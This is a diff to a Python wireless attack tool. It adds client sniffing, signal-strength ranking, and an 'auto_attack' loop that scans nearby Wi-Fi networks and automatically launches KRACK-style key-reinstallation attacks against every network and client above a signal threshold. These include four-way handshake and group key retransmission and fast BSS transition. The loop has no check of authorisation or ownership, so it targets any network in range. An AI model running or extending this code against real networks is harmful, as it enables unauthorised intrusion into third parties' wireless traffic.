@@ -11,8 +11,34 @@ import time
 import threading
 import subprocess
 import sys
+import contextlib
 
 console = Console()
+
+# Configure loguru logger
+logger.remove()  # Remove default handler
+logger.add(sys.stderr, level="INFO")
+
+class TimeoutError(Exception):
+    """Raised when an operation times out."""
+    pass
+
+@contextlib.contextmanager
+def timeout(seconds):
+    """Context manager for timeouts."""
+    def signal_handler(signum, frame):
+        raise TimeoutError()
+    
+    # Set the signal handler and a timeout
+    import signal
+    signal.signal(signal.SIGALRM, signal_handler)
+    signal.alarm(seconds)
+    
+    try:
+        yield
+    finally:
+        # Disable the alarm
+        signal.alarm(0)
 
 # --- Network Utilities ---
 
@@ -513,3 +539,173 @@ def fast_bss_transition_attack(interface, target_ap_mac, target_client_mac):
     else:
         console.print("[bold red]Error:[/] Could not find reassociation request in captured packets.")
         return False
+
+def parse_signal_strength(signal_str):
+    """Parse signal strength from different formats to a comparable number."""
+    try:
+        if 'dBm' in signal_str:
+            return float(signal_str.split('dBm')[0])
+        elif '/' in signal_str:  # Format like 70/100
+            num, den = signal_str.split('/')
+            return float(num) / float(den) * 100
+        else:
+            return float(signal_str)
+    except (ValueError, TypeError):
+        return -100  # Return a very low value for unparseable signals
+
+def detect_clients(interface, ap_mac, timeout=30):
+    """
+    Detect clients connected to a specific access point.
+    
+    Args:
+        interface (str): Network interface to use
+        ap_mac (str): MAC address of the access point
+        timeout (int): How long to scan for clients (in seconds)
+    
+    Returns:
+        list: List of client MAC addresses
+    """
+    logger.info(f"Detecting clients for AP {ap_mac}...")
+    
+    clients = set()
+    start_time = time.time()
+    
+    def packet_filter(pkt):
+        """Filter packets to find client addresses."""
+        if not pkt.haslayer(Dot11):
+            return False
+            
+        # Verify addresses exist and are valid
+        if not hasattr(pkt, 'addr1') or not hasattr(pkt, 'addr2'):
+            return False
+            
+        # Check if packet is to/from our target AP
+        if pkt.addr1 != ap_mac and pkt.addr2 != ap_mac:
+            return False
+            
+        # Exclude broadcast/multicast addresses
+        client_addr = pkt.addr2 if pkt.addr1 == ap_mac else pkt.addr1
+        if (not client_addr or 
+            client_addr == "ff:ff:ff:ff:ff:ff" or 
+            client_addr.startswith("01:00:5e") or 
+            client_addr.startswith("33:33")):
+            return False
+            
+        return True
+    
+    try:
+        # Sniff for packets
+        packets = sniff(
+            iface=interface,
+            timeout=timeout,
+            lfilter=packet_filter
+        )
+        
+        # Extract unique client addresses
+        for pkt in packets:
+            client_addr = pkt.addr2 if pkt.addr1 == ap_mac else pkt.addr1
+            if client_addr not in clients:
+                clients.add(client_addr)
+                logger.info(f"Found client: {client_addr}")
+    
+    except Exception as e:
+        logger.error(f"Error during client detection: {str(e)}")
+    
+    return list(clients)
+
+def sort_networks_by_strength(networks):
+    """Sort networks by signal strength, strongest first."""
+    return sorted(networks, 
+                 key=lambda x: parse_signal_strength(x.get('Signal', '-100')), 
+                 reverse=True)
+
+@logger.catch
+def auto_attack(interface, min_signal=-70, attack_timeout=60, scan_interval=30, single_run=False):
+    """
+    Automatically scan for and attack networks based on signal strength.
+    
+    Args:
+        interface (str): Network interface to use
+        min_signal (int): Minimum signal strength to consider (in dBm)
+        attack_timeout (int): Timeout for each attack attempt in seconds
+        scan_interval (int): Time between network scans in seconds
+        single_run (bool): If True, only run one scan cycle (for testing)
+    
+    Returns:
+        dict: Dictionary of successful attacks by network
+    """
+    results = {}
+    
+    try:
+        while True:
+            # Scan for networks
+            networks = scan_networks(interface)
+            if not networks:
+                if single_run:
+                    break
+                time.sleep(scan_interval)
+                continue
+            
+            # Sort networks by signal strength
+            networks.sort(key=lambda x: parse_signal_strength(x['Signal']), reverse=True)
+            
+            # Try to attack each network above minimum signal strength
+            for network in networks:
+                signal = parse_signal_strength(network['Signal'])
+                if signal >= min_signal:
+                    # Try to detect clients
+                    clients = detect_clients(interface, network['Address'], timeout=attack_timeout)
+                    
+                    if clients:
+                        # Attempt attacks with detected clients
+                        for client in clients:
+                            # Track successful attacks for this network
+                            if network['Address'] not in results:
+                                results[network['Address']] = []
+                            
+                            # Attempt 4-way handshake attacks
+                            try:
+                                if four_way_handshake_plaintext_retransmission(interface, network['Address'], client):
+                                    results[network['Address']].append('4way_plaintext')
+                            except TimeoutError:
+                                pass
+                                
+                            try:
+                                if four_way_handshake_encrypted_retransmission(interface, network['Address'], client):
+                                    results[network['Address']].append('4way_encrypted')
+                            except TimeoutError:
+                                pass
+                            
+                            # Attempt group key attacks
+                            try:
+                                if group_key_handshake_immediate_install(interface, network['Address']):
+                                    results[network['Address']].append('group_immediate')
+                            except TimeoutError:
+                                pass
+                                
+                            try:
+                                if group_key_handshake_delayed_install(interface, network['Address']):
+                                    results[network['Address']].append('group_delayed')
+                            except TimeoutError:
+                                pass
+                            
+                            # Attempt fast BSS transition attack
+                            try:
+                                if fast_bss_transition_attack(interface, network['Address'], client):
+                                    results[network['Address']].append('fast_bss')
+                            except TimeoutError:
+                                pass
+            
+            if single_run:
+                break
+                
+            time.sleep(scan_interval)
+            
+    except KeyboardInterrupt:
+        pass
+    except Exception as e:
+        logger.error(f"Error during auto attack: {str(e)}")
+        if not single_run:
+            time.sleep(scan_interval)
+    
+    return results
